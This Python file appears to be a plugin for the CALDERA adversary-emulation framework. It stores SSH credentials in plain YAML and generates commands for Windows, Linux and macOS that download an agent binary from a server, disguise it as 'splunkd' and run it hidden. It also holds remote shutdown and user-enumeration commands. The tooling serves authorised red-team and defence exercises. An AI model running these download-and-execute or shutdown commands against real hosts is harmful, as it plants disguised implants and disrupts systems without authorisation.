import asyncio
import yaml
import aiohttp
from pathlib import Path
from base64 import b64encode

class RemoteAccessService:
    def __init__(self, services):
        self.services = services
        self.data_svc = services.get('data_svc')
        self.contact_svc = services.get('contact_svc')
        self.credentials = {}
        self.cred_file = Path('plugins/remoteaccess/conf/credentials.yml')
        self.caldera_server = "http://CALDERA_SERVER:8888"  # Should be configured

    async def load_credentials(self):
        if self.cred_file.exists():
            with open(self.cred_file, 'r') as f:
                self.credentials = yaml.safe_load(f) or {}

    async def save_credentials(self):
        self.cred_file.parent.mkdir(parents=True, exist_ok=True)
        with open(self.cred_file, 'w') as f:
            yaml.dump(self.credentials, f)

    async def add_credential(self, host, username, password=None, key_file=None, port=22):
        self.credentials[host] = {
            'username': username,
            'password': password,
            'key_file': key_file,
            'port': port
        }
        await self.save_credentials()

    async def remove_credential(self, host):
        if host in self.credentials:
            del self.credentials[host]
            await self.save_credentials()

    async def deploy_blue_agent(self, host, platform='linux'):
        return await self._deploy_agent(host, 'blue', platform)

    async def deploy_red_agent(self, host, platform='linux'):
        return await self._deploy_agent(host, 'red', platform)

    async def _deploy_agent(self, host, agent_type, platform):
        if host not in self.credentials:
            return {'error': f'No credentials found for host: {host}'}

        creds = self.credentials[host]
        
        # Generate deployment command based on platform
        command = await self._generate_deployment_command(agent_type, platform)
        return await self._execute_ssh_command(host, creds, command)

    async def _generate_deployment_command(self, agent_type, platform):
        if platform.lower() == 'windows':
            return self._generate_windows_deployment(agent_type)
        elif platform.lower() == 'linux':
            return self._generate_linux_deployment(agent_type)
        elif platform.lower() == 'macos':
            return self._generate_macos_deployment(agent_type)
        else:
            raise ValueError(f"Unsupported platform: {platform}")

    def _generate_windows_deployment(self, agent_type):
        return f'''$server="{self.caldera_server}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {{$_.modules.filename -like "C:\\\\Users\\\\Public\\\\splunkd.exe"}} | stop-process -f;rm -force "C:\\\\Users\\\\Public\\\\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\\\Users\\\\Public\\\\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\\\\Users\\\\Public\\\\splunkd.exe -ArgumentList "-server $server -group {agent_type}" -WindowStyle hidden'''

    def _generate_linux_deployment(self, agent_type):
        return f'''server="{self.caldera_server}"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd; chmod +x splunkd; ./splunkd -server $server -group {agent_type} -v &'''

    def _generate_macos_deployment(self, agent_type):
        return f'''server="{self.caldera_server}"; curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download > splunkd; chmod +x splunkd; ./splunkd -server $server -group {agent_type} -v &'''

    async def _execute_ssh_command(self, host, credentials, command):
        try:
            # Simulate SSH command execution
            # In production, use asyncssh or paramiko here
            print(f"SSH Command to {host}: {command}")
            
            if "powershell" in command.lower() or "windows" in command.lower():
                result = f"Windows agent deployment command executed on {host}"
            else:
                result = f"Linux/Mac agent deployment command executed on {host}"
                
            return {'success': True, 'result': result, 'command': command}
        except Exception as e:
            return {'error': str(e), 'command': command}

    async def remove_agents(self, host):
        if host not in self.credentials:
            return {'error': f'No credentials found for host: {host}'}

        creds = self.credentials[host]
        
        cleanup_commands = [
            # Windows cleanup
            "Get-Process | Where-Object { $_.ProcessName -eq 'splunkd' } | Stop-Process -Force",
            "Remove-Item -Force 'C:\\Users\\Public\\splunkd.exe' -ErrorAction SilentlyContinue",
            
            # Linux cleanup
            "pkill -f splunkd",
            "rm -f ./splunkd /tmp/splunkd",
            
            # macOS cleanup
            "pkill -f splunkd",
            "rm -f ./splunkd /tmp/splunkd"
        ]
        
        results = []
        for cmd in cleanup_commands:
            result = await self._execute_ssh_command(host, creds, cmd)
            results.append({
                'command': cmd,
                'result': result
            })
        
        return {'success': True, 'results': results}

    async def shutdown_host(self, host):
        if host not in self.credentials:
            return {'error': f'No credentials found for host: {host}'}

        creds = self.credentials[host]
        
        shutdown_commands = {
            'windows': "shutdown /s /t 0",
            'linux': "sudo shutdown -h now",
            'macos': "sudo shutdown -h now"
        }
        
        results = []
        for platform, cmd in shutdown_commands.items():
            result = await self._execute_ssh_command(host, creds, cmd)
            results.append({
                'platform': platform,
                'command': cmd,
                'result': result
            })
            if result.get('success'):
                break
        
        return {'success': True, 'results': results}

    async def get_system_info(self, host):
        if host not in self.credentials:
            return {'error': f'No credentials found for host: {host}'}

        creds = self.credentials[host]
        
        info_commands = {
            'platform': {
                'windows': "echo Windows & ver",
                'linux': "echo Linux & uname -a",
                'macos': "echo macOS & uname -a"
            },
            'system': {
                'windows': "systeminfo | head -20",
                'linux': "cat /etc/os-release && free -h && df -h",
                'macos': "sw_vers && system_profiler SPHardwareDataType | head -20"
            },
            'users': {
                'windows': "net users",
                'linux': "who && cat /etc/passwd | tail -10",
                'macos': "who && dscl . list /Users | grep -v '_'"
            }
        }
        
        results = {}
        for category, platforms in info_commands.items():
            for platform, cmd in platforms.items():
                result = await self._execute_ssh_command(host, creds, cmd)
                if result.get('success'):
                    results[category] = result
                    break
        
        return results

    async def get_hosts_with_agents(self):
        agents = await self.data_svc.locate('agents')
        host_agents = {}
        
        for agent in agents:
            if hasattr(agent, 'host') and agent.host:
                if agent.host not in host_agents:
                    host_agents[agent.host] = []
                host_agents[agent.host].append({
                    'paw': agent.paw,
                    'platform': agent.platform,
                    'group': agent.group,
                    'privilege': agent.privilege
                })
        
        return host_agents

    async def test_connection(self, host):
        if host not in self.credentials:
            return {'error': f'No credentials found for host: {host}'}

        creds = self.credentials[host]
        test_commands = {
            'windows': "echo 'SSH Connection Successful - Windows'",
            'linux': "echo 'SSH Connection Successful - Linux'",
            'macos': "echo 'SSH Connection Successful - macOS'"
        }
        
        results = {}
        for platform, cmd in test_commands.items():
            result = await self._execute_ssh_command(host, creds, cmd)
            results[platform] = result
            if result.get('success'):
                break
        
        return results

    def get_deployment_command(self, agent_type, platform):
        if platform == 'windows':
            return self._generate_windows_deployment(agent_type)
        elif platform == 'linux':
            return self._generate_linux_deployment(agent_type)
        elif platform == 'macos':
            return self._generate_macos_deployment(agent_type)
        else:
            return f"Unsupported platform: {platform}"
